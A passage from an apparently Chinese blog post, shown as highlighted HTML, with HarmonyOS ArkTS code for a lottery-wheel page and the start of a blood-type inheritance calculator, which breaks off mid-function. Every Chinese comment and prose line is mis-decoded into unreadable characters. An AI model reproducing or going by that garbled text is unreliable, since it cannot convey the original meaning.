è¾¾åˆ°æœ€é«˜é€Ÿåº¦åè¿›å…¥åŒ€é€Ÿé˜¶æ®µ</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">selectedIndex</span>++ <span class="comment">// æ¯æ¬¡è°ƒç”¨æ—¶æ›´æ–°é€‰ä¸­ç´¢å¼•</span></span><br><span class="line">    &#125;, speed)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ä»¥æ’å®šé€Ÿåº¦è¿è¡ŒæŠ½å¥–</span></span><br><span class="line">  <span class="title function_">runAtConstantSpeed</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> speed = <span class="number">40</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>) <span class="comment">// éšæœºç”Ÿæˆä¸€ä¸ªé€Ÿåº¦å€¼</span></span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">intervalID</span>) <span class="comment">// æ¸…é™¤ä¹‹å‰çš„å®šæ—¶å™¨</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">intervalID</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// è®¾ç½®æ–°çš„å®šæ—¶å™¨æ¥æ›´æ–°é€‰ä¸­ç´¢å¼•</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedIndex</span> &gt;= speed) &#123; <span class="comment">// å¦‚æœé€‰ä¸­ç´¢å¼•è¾¾åˆ°é€Ÿåº¦å€¼ï¼Œåœæ­¢å¹¶è¿›å…¥å‡é€Ÿé˜¶æ®µ</span></span><br><span class="line">        <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">intervalID</span>)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">slowDown</span>()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">selectedIndex</span>++</span><br><span class="line">    &#125;, <span class="number">50</span>)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å‡é€Ÿé€»è¾‘</span></span><br><span class="line">  <span class="title function_">slowDown</span>(<span class="params">speed = <span class="number">50</span></span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// è®¾ç½®å»¶æ—¶æ‰§è¡Œ</span></span><br><span class="line">      <span class="keyword">if</span> (speed &lt; <span class="number">500</span>) &#123; <span class="comment">// å¦‚æœé€Ÿåº¦å°äº500ï¼Œåˆ™é€’å½’è°ƒç”¨slowDownä»¥é€æ¸å‡é€Ÿ</span></span><br><span class="line">        speed += <span class="number">50</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">slowDown</span>(speed)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">selectedIndex</span> %= <span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span> <span class="comment">// ç¡®ä¿ç´¢å¼•åœ¨æœ‰æ•ˆèŒƒå›´å†…</span></span><br><span class="line">        <span class="keyword">let</span> index = <span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>] <span class="comment">// è·å–æœ€ç»ˆé€‰ä¸­çš„å¥–å“ç´¢å¼•</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isAnimating</span> = <span class="literal">false</span> <span class="comment">// åŠ¨ç”»ç»“æŸ</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">getUIContext</span>().<span class="title function_">showAlertDialog</span>(&#123; <span class="comment">// æ˜¾ç¤ºç»“æœå¯¹è¯æ¡†</span></span><br><span class="line">          <span class="attr">title</span>: <span class="string">&#x27;ç»“æœ&#x27;</span>,</span><br><span class="line">          <span class="attr">message</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.prizeArray[index].title&#125;</span><span class="subst">$&#123;<span class="variable language_">this</span>.prizeArray[index].description&#125;</span>`</span>, <span class="comment">// æ˜¾ç¤ºå¥–å“ä¿¡æ¯</span></span><br><span class="line">          <span class="attr">confirm</span>: &#123;</span><br><span class="line">            <span class="attr">defaultFocus</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">value</span>: <span class="string">&#x27;æˆ‘çŸ¥é“äº†&#x27;</span>, <span class="comment">// ç¡®è®¤æŒ‰é’®æ–‡æœ¬</span></span><br><span class="line">            <span class="attr">action</span>: <span class="function">() =&gt;</span> &#123;&#125; <span class="comment">// ç‚¹å‡»ç¡®è®¤åçš„æ“ä½œ</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">alignment</span>: <span class="title class_">DialogAlignment</span>.<span class="property">Center</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">selectedIndex</span>++</span><br><span class="line">    &#125;, speed)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºUIæ–¹æ³•</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// ä½¿ç”¨Columnå¸ƒå±€å®¹å™¨</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123; <span class="comment">// ä½¿ç”¨å¼¹æ€§å¸ƒå±€ï¼Œå…è®¸æ¢è¡Œ</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">prizeArray</span>, <span class="function">(<span class="params">item: Prize, index: number</span>) =&gt;</span> &#123; <span class="comment">// éå†å¥–å“æ•°ç»„ï¼Œåˆ›å»ºæ¯ä¸ªå¥–å“çš„UI</span></span><br><span class="line">          <span class="title class_">Column</span>() &#123; <span class="comment">// ä½¿ç”¨Columnå¸ƒå±€å®¹å™¨ä¸ºæ¯ä¸ªå¥–å“é¡¹</span></span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item.title&#125;</span>`</span>) <span class="comment">// æ˜¾ç¤ºå¥–å“æ ‡é¢˜</span></span><br><span class="line">              .<span class="title function_">fontColor</span>(index == <span class="number">4</span> ? <span class="title class_">Color</span>.<span class="property">White</span> : item.<span class="property">color</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²ï¼Œå¯¹äºæŠ½å¥–æŒ‰é’®ç‰¹æ®Šå¤„ç†</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">16</span>)</span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item.description&#125;</span>`</span>) <span class="comment">// æ˜¾ç¤ºå¥–å“æè¿°</span></span><br><span class="line">              .<span class="title function_">fontColor</span>(index == <span class="number">4</span> ? <span class="title class_">Color</span>.<span class="property">White</span> : item.<span class="property">color</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">20</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// æ·»åŠ ç‚¹å‡»æ•ˆæœ</span></span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å¤„ç†ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimating</span>) &#123; <span class="comment">// å¦‚æœæ­£åœ¨åŠ¨ç”»ä¸­ï¼Œå¿½ç•¥ç‚¹å‡»</span></span><br><span class="line">              <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">4</span>) &#123; <span class="comment">// å¦‚æœç‚¹å‡»çš„æ˜¯æŠ½å¥–æŒ‰é’®ï¼Œå¼€å§‹æŠ½å¥–</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">isAnimating</span> = <span class="literal">true</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">startLottery</span>()</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[i] == index) &#123;</span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">selectedIndex</span> = i <span class="comment">// æ›´æ–°é€‰ä¸­ç´¢å¼•åˆ°å¯¹åº”ä½ç½®</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Center</span>) <span class="comment">// è®¾ç½®æ°´å¹³å±…ä¸­å¯¹é½</span></span><br><span class="line">          .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>) <span class="comment">// è®¾ç½®å‚ç›´å±…ä¸­å¯¹é½</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å•å…ƒæ ¼å®½åº¦</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å•å…ƒæ ¼é«˜åº¦</span></span><br><span class="line">          .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseMargin&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å•å…ƒæ ¼è¾¹è·</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(index == <span class="number">4</span> ? <span class="string">&quot;#ff5444&quot;</span> : <span class="comment">// æŠ½å¥–æŒ‰é’®èƒŒæ™¯é¢œè‰²ç‰¹æ®Šå¤„ç†</span></span><br><span class="line">            (<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span> % <span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>] == index ? <span class="title class_">Color</span>.<span class="property">Gray</span> : <span class="title class_">Color</span>.<span class="property">White</span>))</span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="comment">// è®¾ç½®é˜´å½±æ•ˆæœ</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">10</span>,</span><br><span class="line">            <span class="attr">color</span>: <span class="string">&quot;#f98732&quot;</span>,</span><br><span class="line">            <span class="attr">offsetX</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">offsetY</span>: <span class="number">20</span></span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth * <span class="number">3</span> + <span class="variable language_">this</span>.baseMargin * <span class="number">6</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®æ•´ä½“å®½åº¦</span></span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">30</span> &#125;) <span class="comment">// è®¾ç½®é¡¶éƒ¨è¾¹è·</span></span><br><span class="line">      <span class="title class_">MyPrizeUpdate</span>().<span class="title function_">margin</span>(&#123;<span class="attr">top</span>:<span class="number">20</span>&#125;) <span class="comment">// æ’å…¥MyPrizeUpdateç»„ä»¶ï¼Œå¹¶è®¾ç½®å…¶ä¸Šè¾¹è·</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®é«˜åº¦ä¸º100%</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦ä¸º100%</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#ffb350&quot;</span>) <span class="comment">// è®¾ç½®é¡µé¢èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LotteryPageå…¥å£ç»„ä»¶LotteryPageæ˜¯æ•´ä¸ªæŠ½å¥–åº”ç”¨çš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£ç»„ç»‡é¡µé¢å¸ƒå±€å’Œå¤„ç†ç”¨æˆ·äº¤äº’é€»è¾‘ã€‚å®ƒåˆå§‹åŒ–äº†ä¸€ç³»åˆ—å¿…è¦çš„çŠ¶æ€å˜é‡ï¼Œæ¯”å¦‚ä¿å­˜æ‰€æœ‰å¥–å“çš„æ•°ç»„prizeArrayã€å®šä¹‰æŠ½å¥–é¡ºåºçš„selectionOrderä»¥åŠæ§åˆ¶åŠ¨ç”»çŠ¶æ€çš„isAnimatingç­‰ã€‚æ­¤å¤–ï¼Œè¯¥ç»„ä»¶å®ç°äº†æŠ½å¥–è¿‡ç¨‹çš„å…³é”®æ–¹æ³•â€”â€”startLotteryï¼ˆå¼€å§‹æŠ½å¥–ï¼‰ã€runAtConstantSpeedï¼ˆåŒ€é€Ÿè¿è¡Œï¼‰å’ŒslowDownï¼ˆå‡é€Ÿï¼‰ï¼Œå®ƒä»¬å…±åŒåä½œä»¥æ¨¡æ‹ŸçœŸå®çš„æŠ½å¥–ä½“éªŒã€‚å½“ç”¨æˆ·ç‚¹å‡»æŠ½å¥–æŒ‰é’®æ—¶ï¼Œè¿™äº›æ–¹æ³•æŒ‰ç…§é¢„å®šçš„é€Ÿåº¦æ¨¡å¼ä¾æ¬¡è°ƒç”¨ï¼Œç›´åˆ°æœ€ç»ˆç¡®å®šä¸€ä¸ªå¥–å“ä¸ºæ­¢ã€‚æœ€åï¼Œé€šè¿‡å¼¹å‡ºå¯¹è¯æ¡†çš„æ–¹å¼å‘ç”¨æˆ·å±•ç¤ºæŠ½å¥–ç»“æœã€‚</p><h1 id="blood"><a href="#blood" class="headerlink" title="blood"></a>blood</h1><p>è¡€å‹è®¡ç®—</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// å¯¼å…¥SegmentButtonåŠå…¶ç›¸å…³ç±»å‹å®šä¹‰</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">SegmentButton</span>, <span class="title class_">SegmentButtonItemTuple</span>, <span class="title class_">SegmentButtonOptions</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä½¿ç”¨@Entryè£…é¥°å™¨æ ‡è®°æ­¤ç»„ä»¶ä¸ºå…¥å£ç‚¹</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">  <span class="comment">// ä½¿ç”¨@Componentè£…é¥°å™¨æ ‡è®°æ­¤ç»“æ„ä½“ä¸ºä¸€ä¸ªç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">  <span class="comment">// å®šä¹‰ä¸€ä¸ªåä¸ºBloodTypeCalculatorçš„ç»“æ„ä½“ï¼Œç”¨äºå®ç°è¡€å‹é—ä¼ è®¡ç®—åŠŸèƒ½</span></span><br><span class="line">struct <span class="title class_">BloodTypeCalculator</span> &#123;</span><br><span class="line">  <span class="comment">// å®šä¹‰ä¸»é¢˜é¢œè‰²ï¼Œé»˜è®¤ä¸ºæ©™è‰²</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">themeColor</span>: string | <span class="title class_">Color</span> = <span class="title class_">Color</span>.<span class="property">Orange</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰æ–‡æœ¬é¢œè‰²ï¼Œé»˜è®¤ä¸ºæ·±ç°è‰²</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">textColor</span>: string = <span class="string">&quot;#2e2e2e&quot;</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰è¾¹æ¡†é¢œè‰²ï¼Œé»˜è®¤ä¸ºæµ…ç°è‰²</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">lineColor</span>: string = <span class="string">&quot;#d5d5d5&quot;</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰åŸºç¡€å†…è¾¹è·å¤§å°ï¼Œé»˜è®¤ä¸º30</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">basePadding</span>: number = <span class="number">30</span>;</span><br><span class="line">  <span class="comment">// å­˜å‚¨å¯èƒ½çš„è¡€å‹ç»“æœ</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">possibleBloodTypesText</span>: string = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="comment">// å­˜å‚¨ä¸å¯èƒ½çš„è¡€å‹ç»“æœ</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">impossibleBloodTypesText</span>: string = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="comment">// å®šä¹‰è¡€å‹åˆ—è¡¨ï¼ŒåŒ…å«Aã€Bã€ABã€Oå››ç§è¡€å‹</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">bloodTypeList</span>: object[] = [<span class="title class_">Object</span>(&#123; <span class="attr">text</span>: <span class="string">&#x27;A&#x27;</span> &#125;), <span class="title class_">Object</span>(&#123; <span class="attr">text</span>: <span class="string">&#x27;B&#x27;</span> &#125;), <span class="title class_">Object</span>(&#123; <span class="attr">text</span>: <span class="string">&#x27;AB&#x27;</span> &#125;), <span class="title class_">Object</span>(&#123; <span class="attr">text</span>: <span class="string">&#x27;O&#x27;</span> &#125;)];</span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–å•é€‰èƒ¶å›ŠæŒ‰é’®çš„é…ç½®é¡¹</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">singleSelectCapsuleOptions</span>: <span class="title class_">SegmentButtonOptions</span> | <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span class="line">  <span class="comment">// ç›‘å¬çˆ¶äº²è¡€å‹é€‰æ‹©å˜åŒ–</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;capsuleSelectedIndexesChanged&#x27;</span>) <span class="attr">fatherBloodTypeIndex</span>: number[] = [<span class="number">0</span>];</span><br><span class="line">  <span class="comment">// ç›‘å¬æ¯äº²è¡€å‹é€‰æ‹©å˜åŒ–</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;capsuleSelectedIndexesChanged&#x27;</span>) <span class="attr">motherBloodTypeIndex</span>: number[] = [<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ ¹æ®è¡€å‹è·å–å…¶å¯èƒ½çš„åŸºå› ç»„åˆ</span></span><br><span class="line">  <span class="title function_">getGenes</span>(<span class="attr">bloodType</span>: string): string[] &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bloodType:<span class="subst">$&#123;bloodType&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">switch</span> (bloodType) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>: <span class="keyword">return</span> [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;O&#x27;</span>]; <span class="comment">// Aå‹è¡€å¯èƒ½çš„åŸºå› ç»„åˆ</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="keyword">return</span> [<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;O&#x27;</span>]; <span class="comment">// Bå‹è¡€å¯èƒ½çš„åŸºå› ç»„åˆ</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;AB&#x27;</span>: <span class="keyword">return</span> [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]; <span class="comment">// ABå‹è¡€å¯èƒ½çš„åŸºå› ç»„åˆ</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>: <span class="keyword">return</span> [<span class="string">&#x27;O&#x27;</span>]; <span class="comment">// Oå‹è¡€å¯èƒ½çš„åŸºå› ç»„åˆ</span></span><br><span class="line">      <span class="attr">default</span>: <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid blood type&#x27;</span>); <span class="comment">// éæ³•è¡€å‹æŠ›å‡ºé”™è¯¯</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç»„åˆçˆ¶æ¯çš„åŸºå› ä»¥è·å¾—å­ä»£å¯èƒ½çš„åŸºå› ç»„åˆ</span></span><br><span class="line">  <span class="title function_">combineGenes</span>(<span class="attr">fatherGenes</span>: string[], <span class="attr">motherGenes</span>: string[]): string[] &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">possibleGenes</span>: string[] = []; <span class="comment">// ç”¨äºå­˜å‚¨å¯èƒ½çš„åŸºå› ç»„åˆ</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> fatherGene <span class="keyword">of</span> fatherGenes) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> motherGene <span class="keyword">of</span> motherGenes) &#123;</span><br><span class="line">        <span class="keyword">const</span> combinedGene = [fatherGene, motherGene].<span class="title function_">sort</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>); <span class="comment">// å°†çˆ¶æ¯çš„åŸºå› ç»„åˆå¹¶æ’åºååŠ å…¥æ•°ç»„</span></span><br><span class="line">        <span class="keyword">if</span> (!possibleGenes.<span class="title function_">includes</span>(combinedGene)) &#123;</span><br><span class="line">          possibleGenes.<span class="title function_">push</span>(combinedGene); <span class="comment">// å¦‚æœç»„åˆå°šæœªå­˜åœ¨ï¼Œåˆ™åŠ å…¥æ•°ç»„</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> possibleGenes; <span class="comment">// è¿”å›æ‰€æœ‰å¯èƒ½çš„åŸºå› ç»„åˆ</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ ¹æ®åŸºå› ç»„åˆç¡®å®šè¡€å‹</span></span><br><span class="line">  <span class="title function_">getBloodTypesFromGenes</span>(<span class="attr">genes</span>: string[]): string[] &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">bloodTypes</span>: string[] = []; <span class="comment">// ç”¨äºå­˜å‚¨å¯èƒ½çš„è¡€å‹</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> gene <span class="keyword">of</span> genes) &#123;</span><br><span class="line">      <span class="keyword">if</span> (gene === <span class="string">&#x27;AA&#x27;</span> || gene === <span class="string">&#x27;AO&#x27;</span> || gene === <span class="string">&#x27;OA&#x27;</span>) &#123;</span><br><span class="line">        bloodTypes.<span class="title function_">push</span>(<span class="string">&#x27;A&#x27;</span>); <span class="comment">// åŸºå› ç»„åˆä¸ºAAã€AOæˆ–OAæ—¶ï¼Œè¡€å‹ä¸ºA</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gene === <span class="string">&#x27;BB&#x27;</span> || gene === <span class="string">&#x27;BO&#x27;</span> || gene === <span class="string">&#x27;OB&#x27;</span>) &#123;</span><br><span class="line">        bloodTypes.<span class="title function_">push</span>(<span class="string">&#x27;B&#x27;</span>); <span class="comment">// åŸºå› ç»„åˆä¸ºBBã€BOæˆ–OBæ—¶ï¼Œè¡€å‹ä¸ºB</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gene === <span class="string">&#x27;AB&#x27;</span> || gene === <span class="string">&#x27;BA&#x27;</span>) &#123;</span><br><span class="line">        bloodTypes.<span class="title function_">push</span>(<span class="string">&#x27;AB&#x27;</span>); <span class="comment">// åŸºå› ç»„åˆä¸ºABæˆ–BAæ—¶ï¼Œè¡€å‹ä¸ºAB</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gene === <span class="string">&#x27;OO&#x27;</span>) 